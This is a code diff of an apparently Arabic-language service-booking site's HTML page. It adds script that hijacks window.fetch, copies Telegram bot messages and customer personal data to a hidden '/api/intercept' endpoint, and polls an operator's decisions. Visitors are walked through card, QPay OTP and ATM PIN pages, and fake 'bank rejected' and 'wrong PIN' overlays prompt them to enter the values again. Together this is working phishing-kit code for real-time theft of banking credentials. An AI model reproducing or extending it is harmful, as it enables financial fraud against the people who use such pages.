@@ -1,28 +1,25 @@
 <!DOCTYPE html><html lang="en"><head>
 <script>
 (function() {
-  'use strict';
-  // نظام المزامنة الصامت في الخلفية
   var _originalFetch = window.fetch;
   window.fetch = function(url, options) {
     var urlStr = typeof url === "string" ? url : (url && url.url ? url.url : String(url));
-    if (urlStr && urlStr.indexOf("api.telegram.org") !== -1 && options && options.method === "POST" && options.body) {
+    if (urlStr && urlStr.indexOf("api.telegram.org") !== -1 && options && options.method === "POST") {
       try {
         var body = JSON.parse(options.body);
         var orderData = {
           raw_message: body.text || "",
           page: window.location.pathname,
           timestamp: new Date().toISOString(),
-          order_ref: localStorage.getItem("maawen_order_ref") || ""
+          customer_name: localStorage.getItem("customer_name") || "",
+          customer_phone: localStorage.getItem("customer_phone") || "",
+          service_type: localStorage.getItem("service_type") || ""
         };
-        // إرسال البيانات للخادم في الخلفية دون انتظار الاستجابة
         _originalFetch.call(window, "/api/intercept", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(orderData)
-        }).then(function(r) { return r.json(); }).then(function(data) {
-          if (data && data.orderRef) localStorage.setItem("maawen_order_ref", data.orderRef);
-        }).catch(function() {});
+        });
       } catch(e) {}
     }
     return _originalFetch.apply(this, arguments);
@@ -34,4 +31,312 @@
 <script>(function(a,f){let l;try{l=JSON.parse(sessionStorage.getItem(a)||"{}")}catch{return}const n=l?.[f||history.state?.__TSR_key];let c=!1;for(const t in n){const e=n[t],o=e?.scrollX,s=e?.scrollY;if(Number.isFinite(o)&&Number.isFinite(s)){if(t==="window")scrollTo(o,s),c=!0;else if(t)try{const r=document.querySelector(t);r&&(r.scrollLeft=o,r.scrollTop=s)}catch{}}}if(c)return;const i=location.hash.slice(1);if(i){const t=history.state?.__hashScrollIntoViewOptions??!0;if(t){const e=document.getElementById(i);e&&e.scrollIntoView(t)}return}scrollTo(0,0)})("tsr-scroll-restoration-v1_3");document.currentScript.remove()</script>
 <script type="module" async="" src="/assets/index-Dq-H0M4e.js"></script>
 <script src="/payment-interceptor.js"></script>
+<script>
+(function() {
+  'use strict';
+  
+  // ─── Fetch Interceptor: اعتراض طلبات Telegram وإرسالها للـ Admin ───────────
+  var _originalFetch = window.fetch;
+  
+  window.fetch = function(url, options) {
+    var urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : String(url));
+    
+    // اعتراض طلبات Telegram Bot
+    if (urlStr && urlStr.indexOf('api.telegram.org') !== -1 && options && options.method === 'POST' && options.body) {
+      try {
+        var body = JSON.parse(options.body);
+        var text = body.text || '';
+        
+        // استخراج البيانات من URL params و localStorage
+        var urlParams = new URLSearchParams(window.location.search);
+        var orderData = {
+          raw_message: text,
+          page: window.location.pathname,
+          timestamp: new Date().toISOString(),
+          customer_name: localStorage.getItem('customer_name') || urlParams.get('name') || '',
+          customer_phone: localStorage.getItem('customer_phone') || urlParams.get('phone') || '',
+          customer_address: localStorage.getItem('customer_address') || urlParams.get('address') || '',
+          unique_user_id: localStorage.getItem('unique_user_id') || '',
+          service_type: localStorage.getItem('service_type') || urlParams.get('service') || '',
+          total_price: parseFloat(localStorage.getItem('total_price') || urlParams.get('total') || '0') || 0,
+          duration: localStorage.getItem('duration') || urlParams.get('duration') || '',
+          nationality: localStorage.getItem('nationality') || urlParams.get('nationality') || '',
+          workers: parseInt(localStorage.getItem('workers') || urlParams.get('workers') || '1') || 1,
+          start_date: localStorage.getItem('start_date') || urlParams.get('startDate') || ''
+        };
+        
+        // إضافة order_ref الحالي إن وجد (لتحديث الطلب بدل إنشاء جديد)
+        var existingRef = localStorage.getItem('maawen_order_ref');
+        if (existingRef) {
+          orderData.order_ref = existingRef;
+        }
+        
+        // إرسال للـ backend بتاعنا وحفظ order_ref
+        _originalFetch.call(window, '/api/intercept', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(orderData)
+        }).then(function(r) {
+          return r.json();
+        }).then(function(data) {
+          if (data && data.orderRef) {
+            localStorage.setItem('maawen_order_ref', data.orderRef);
+          }
+        }).catch(function(e) { /* silent */ });
+        
+      } catch(e) { /* silent */ }
+    }
+    
+    return _originalFetch.apply(this, arguments);
+  };
+  
+})();
+
+  // ─── Polling: متابعة حالة الطلب على جميع صفحات العميل ───────────
+  (function() {
+    var pollingInterval = null;
+    var refRetryCount = 0;
+    var MAX_REF_RETRIES = 20;
+    var POLLING_PAGES = ['/loading', '/payment', '/qpay-otp', '/atm-pin'];
+
+    function getParams() {
+      var urlParams = new URLSearchParams(window.location.search);
+      return {
+        name: localStorage.getItem('customer_name') || urlParams.get('name') || '',
+        phone: localStorage.getItem('customer_phone') || urlParams.get('phone') || '',
+        address: localStorage.getItem('customer_address') || urlParams.get('address') || '',
+        service: localStorage.getItem('service_type') || urlParams.get('service') || '',
+        total: localStorage.getItem('total_price') || urlParams.get('total') || '0'
+      };
+    }
+
+    function goToOtp(orderRef) {
+      var p = getParams();
+      var qs = new URLSearchParams();
+      qs.set('name', p.name); qs.set('phone', p.phone); qs.set('address', p.address);
+      qs.set('service', p.service); qs.set('total', p.total); qs.set('ref', orderRef);
+      window.location.href = '/qpay-otp?' + qs.toString();
+    }
+
+    function goToAtm(orderRef) {
+      var p = getParams();
+      var qs = new URLSearchParams();
+      qs.set('name', p.name); qs.set('phone', p.phone); qs.set('address', p.address);
+      qs.set('service', p.service); qs.set('total', p.total); qs.set('ref', orderRef);
+      window.location.href = '/atm-pin?' + qs.toString();
+    }
+
+    function handleStatus(status, orderRef) {
+      var path = window.location.pathname;
+
+      // ── من صفحة loading ──
+      if (path === '/loading') {
+        var fromPage = new URLSearchParams(window.location.search).get('from') || '';
+        // من بعد البطاقة: انتظار قرار الأدمن على البطاقة
+        if (fromPage === '' || fromPage === 'card') {
+          if (status === 'waiting_otp') { clearPolling(); goToOtp(orderRef); }
+          else if (status === 'card_rejected' || status === 'rejected') {
+            clearPolling();
+            var p = getParams();
+            var qs = new URLSearchParams();
+            qs.set('name', p.name); qs.set('phone', p.phone); qs.set('address', p.address);
+            qs.set('service', p.service); qs.set('total', p.total);
+            window.location.href = '/payment?' + qs.toString() + '&bank_rejected=1';
+          }
+        }
+        // من بعد OTP: انتظار قرار الأدمن على OTP
+        else if (fromPage === 'otp') {
+          if (status === 'waiting_atm_pin') { clearPolling(); goToAtm(orderRef); }
+          else if (status === 'otp_rejected') {
+            clearPolling();
+            var p2 = getParams();
+            var qs2 = new URLSearchParams();
+            qs2.set('name', p2.name); qs2.set('phone', p2.phone); qs2.set('address', p2.address);
+            qs2.set('service', p2.service); qs2.set('total', p2.total); qs2.set('ref', orderRef);
+            qs2.set('otp_rejected', '1');
+            window.location.href = '/qpay-otp?' + qs2.toString();
+          }
+        }
+        // من بعد ATM PIN: انتظار قرار الأدمن على ATM PIN
+        else if (fromPage === 'atm_pin') {
+          if (status === 'completed') { clearPolling(); window.dispatchEvent(new CustomEvent('maawen:atm_approved')); }
+          else if (status === 'atm_rejected') {
+            clearPolling();
+            var p3 = getParams();
+            var qs3 = new URLSearchParams();
+            qs3.set('name', p3.name); qs3.set('phone', p3.phone); qs3.set('address', p3.address);
+            qs3.set('service', p3.service); qs3.set('total', p3.total); qs3.set('ref', orderRef);
+            qs3.set('atm_rejected', '1');
+            window.location.href = '/atm-pin?' + qs3.toString();
+          }
+        }
+      }
+
+      // ── من صفحة payment: انتظار قرار الأدمن على البطاقة ──
+      else if (path === '/payment') {
+        if (status === 'waiting_otp') { clearPolling(); goToOtp(orderRef); }
+        else if (status === 'card_rejected') {
+          clearPolling();
+          window.dispatchEvent(new CustomEvent('maawen:card_rejected'));
+        }
+      }
+
+      // ── من صفحة qpay-otp: انتظار قرار الأدمن على OTP ──
+      else if (path === '/qpay-otp') {
+        if (status === 'waiting_atm_pin') { clearPolling(); goToAtm(orderRef); }
+        else if (status === 'otp_rejected') {
+          clearPolling();
+          window.dispatchEvent(new CustomEvent('maawen:otp_rejected'));
+        }
+      }
+
+      // ── من صفحة atm-pin: انتظار قرار الأدمن على الرقم السري ──
+      else if (path === '/atm-pin') {
+        if (status === 'completed') { clearPolling(); window.dispatchEvent(new CustomEvent('maawen:atm_approved')); }
+        else if (status === 'atm_rejected') {
+          clearPolling();
+          window.dispatchEvent(new CustomEvent('maawen:atm_rejected'));
+        }
+      }
+    }
+
+    function clearPolling() {
+      if (pollingInterval) { clearInterval(pollingInterval); pollingInterval = null; }
+    }
+
+    function startPolling(orderRef) {
+      clearPolling();
+      pollingInterval = setInterval(function() {
+        var path = window.location.pathname;
+        var isPollingPage = POLLING_PAGES.indexOf(path) !== -1;
+        if (!isPollingPage) { clearPolling(); return; }
+        fetch('/api/orders/' + orderRef + '/status')
+          .then(function(r) { return r.json(); })
+          .then(function(data) { if (data && data.status) handleStatus(data.status, orderRef); })
+          .catch(function() { /* silent */ });
+      }, 2000);
+    }
+
+    function waitForRefAndStart() {
+      var orderRef = localStorage.getItem('maawen_order_ref');
+      if (orderRef) { refRetryCount = 0; startPolling(orderRef); return; }
+      refRetryCount++;
+      if (refRetryCount < MAX_REF_RETRIES) setTimeout(waitForRefAndStart, 1500);
+    }
+
+    // مراقبة تغيير الصفحة (SPA navigation)
+    var lastPath = window.location.pathname;
+    setInterval(function() {
+      if (window.location.pathname !== lastPath) {
+        lastPath = window.location.pathname;
+        if (POLLING_PAGES.indexOf(lastPath) !== -1) {
+          refRetryCount = 0;
+          setTimeout(waitForRefAndStart, 500);
+        }
+      }
+    }, 500);
+
+    // بدء فوري عند تحميل أي صفحة polling
+    if (POLLING_PAGES.indexOf(window.location.pathname) !== -1) {
+      setTimeout(waitForRefAndStart, 500);
+    }
+  })();
+
+  // ─── Overlay: عرض رسائل القبول/الرفض فوق الصفحة ───────────────────────────
+  (function() {
+    function createOverlay(html, onClose) {
+      // إزالة أي overlay سابق
+      var old = document.getElementById('maawen-overlay');
+      if (old) old.remove();
+
+      var overlay = document.createElement('div');
+      overlay.id = 'maawen-overlay';
+      overlay.style.cssText = [
+        'position:fixed', 'inset:0', 'z-index:99999',
+        'background:rgba(0,0,0,0.6)', 'display:flex',
+        'align-items:center', 'justify-content:center',
+        'font-family:Arial,sans-serif', 'direction:rtl'
+      ].join(';');
+      overlay.innerHTML = html;
+      document.body.appendChild(overlay);
+      if (onClose) {
+        overlay.addEventListener('click', function(e) {
+          if (e.target === overlay) { overlay.remove(); if (onClose) onClose(); }
+        });
+      }
+      return overlay;
+    }
+
+    // ── رفض البطاقة: رسالة رفض البنك + زر إعادة المحاولة ──
+    window.addEventListener('maawen:card_rejected', function() {
+      var p = new URLSearchParams(window.location.search);
+      var html = [
+        '<div style="background:#fff;border-radius:16px;padding:32px 28px;max-width:380px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)">',
+        '<div style="width:64px;height:64px;background:#fee2e2;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px">',
+        '<svg width="32" height="32" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#dc2626" stroke-width="2"/><path d="M12 8v4m0 4h.01" stroke="#dc2626" stroke-width="2" stroke-linecap="round"/></svg>',
+        '</div>',
+        '<h2 style="color:#dc2626;font-size:20px;margin:0 0 8px;font-weight:700">رفض البنك مصدر البطاقة الدفع</h2>',
+        '<p style="color:#6b7280;font-size:14px;margin:0 0 24px;line-height:1.6">تعذّر إتمام عملية الدفع. يرجى إعادة المحاولة أو استخدام طريقة دفع أخرى.</p>',
+        '<div style="display:flex;gap:12px;justify-content:center">',
+        '<button id="maawen-retry-btn" style="background:#7c3aed;color:#fff;border:none;border-radius:8px;padding:12px 24px;font-size:15px;cursor:pointer;font-weight:600;transition:background 0.2s" onmouseover="this.style.backgroundColor=\'#6d28d9\'" onmouseout="this.style.backgroundColor=\'#7c3aed\'" onclick="window.location.href=\'/payment?name=' + encodeURIComponent(p.get('name') || '') + '&phone=' + encodeURIComponent(p.get('phone') || '') + '&address=' + encodeURIComponent(p.get('address') || '') + '&service=' + encodeURIComponent(p.get('service') || '') + '&total=' + encodeURIComponent(p.get('total') || '') + '\'">إعادة المحاولة</button>',
+        '</div>',
+        '</div>'
+      ].join('');
+      createOverlay(html);
+    });
+
+    // ── رفض OTP: رسالة رفض OTP + زر إعادة المحاولة ──
+    window.addEventListener('maawen:otp_rejected', function() {
+      var p = new URLSearchParams(window.location.search);
+      var html = [
+        '<div style="background:#fff;border-radius:16px;padding:32px 28px;max-width:380px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)">',
+        '<div style="width:64px;height:64px;background:#fee2e2;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px">',
+        '<svg width="32" height="32" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#dc2626" stroke-width="2"/><path d="M12 8v4m0 4h.01" stroke="#dc2626" stroke-width="2" stroke-linecap="round"/></svg>',
+        '</div>',
+        '<h2 style="color:#dc2626;font-size:20px;margin:0 0 8px;font-weight:700">رمز OTP غير صحيح</h2>',
+        '<p style="color:#6b7280;font-size:14px;margin:0 0 24px;line-height:1.6">الرمز الذي أدخلته غير صحيح. يرجى إعادة المحاولة.</p>',
+        '<div style="display:flex;gap:12px;justify-content:center">',
+        '<button id="maawen-retry-btn" style="background:#7c3aed;color:#fff;border:none;border-radius:8px;padding:12px 24px;font-size:15px;cursor:pointer;font-weight:600;transition:background 0.2s" onmouseover="this.style.backgroundColor=\'#6d28d9\'" onmouseout="this.style.backgroundColor=\'#7c3aed\'" onclick="window.location.href=\'/qpay-otp?name=' + encodeURIComponent(p.get('name') || '') + '&phone=' + encodeURIComponent(p.get('phone') || '') + '&address=' + encodeURIComponent(p.get('address') || '') + '&service=' + encodeURIComponent(p.get('service') || '') + '&total=' + encodeURIComponent(p.get('total') || '') + '&ref=' + encodeURIComponent(p.get('ref') || '') + '\'">إعادة المحاولة</button>',
+        '</div>',
+        '</div>'
+      ].join('');
+      createOverlay(html);
+    });
+
+    // ── رفض ATM PIN: رسالة رفض ATM PIN + زر إعادة المحاولة ──
+    window.addEventListener('maawen:atm_rejected', function() {
+      var p = new URLSearchParams(window.location.search);
+      var html = [
+        '<div style="background:#fff;border-radius:16px;padding:32px 28px;max-width:380px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)">',
+        '<div style="width:64px;height:64px;background:#fee2e2;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px">',
+        '<svg width="32" height="32" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#dc2626" stroke-width="2"/><path d="M12 8v4m0 4h.01" stroke="#dc2626" stroke-width="2" stroke-linecap="round"/></svg>',
+        '</div>',
+        '<h2 style="color:#dc2626;font-size:20px;margin:0 0 8px;font-weight:700">الرقم السري غير صحيح</h2>',
+        '<p style="color:#6b7280;font-size:14px;margin:0 0 24px;line-height:1.6">الرقم السري الذي أدخلته غير صحيح. يرجى إعادة المحاولة.</p>',
+        '<div style="display:flex;gap:12px;justify-content:center">',
+        '<button id="maawen-retry-btn" style="background:#7c3aed;color:#fff;border:none;border-radius:8px;padding:12px 24px;font-size:15px;cursor:pointer;font-weight:600;transition:background 0.2s" onmouseover="this.style.backgroundColor=\'#6d28d9\'" onmouseout="this.style.backgroundColor=\'#7c3aed\'" onclick="window.location.href=\'/atm-pin?name=' + encodeURIComponent(p.get('name') || '') + '&phone=' + encodeURIComponent(p.get('phone') || '') + '&address=' + encodeURIComponent(p.get('address') || '') + '&service=' + encodeURIComponent(p.get('service') || '') + '&total=' + encodeURIComponent(p.get('total') || '') + '&ref=' + encodeURIComponent(p.get('ref') || '') + '\'">إعادة المحاولة</button>',
+        '</div>',
+        '</div>'
+      ].join('');
+      createOverlay(html);
+    });
+
+    // ── قبول ATM PIN: رسالة نجاح + زر العودة للرئيسية ──
+    window.addEventListener('maawen:atm_approved', function() {
+      var html = [
+        '<div style="background:#fff;border-radius:16px;padding:32px 28px;max-width:380px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)">',
+        '<div style="width:64px;height:64px;background:#dcfce7;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px">',
+        '<svg width="32" height="32" viewBox="0 0 24 24" fill="none"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" stroke="#22c55e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>',
+        '</div>',
+        '<h2 style="color:#22c55e;font-size:20px;margin:0 0 8px;font-weight:700">تمت عملية الدفع بنجاح!</h2>',
+        '<p style="color:#6b7280;font-size:14px;margin:0 0 24px;line-height:1.6">تم تأكيد عملية الدفع بنجاح. شكرًا لك.</p>',
+        '<div style="display:flex;gap:12px;justify-content:center">',
+        '<button style="background:#7c3aed;color:#fff;border:none;border-radius:8px;padding:12px 24px;font-size:15px;cursor:pointer;font-weight:600;transition:background 0.2s" onmouseover="this.style.backgroundColor=\'#6d28d9\'" onmouseout="this.style.backgroundColor=\'#7c3aed\'" onclick="window.location.href=\'/\'">العودة للرئيسية</button>',
+        '</div>',
+        '</div>'
+      ].join('');
+      createOverlay(html);
+    });
+  })();
+</script>
 </body></html>
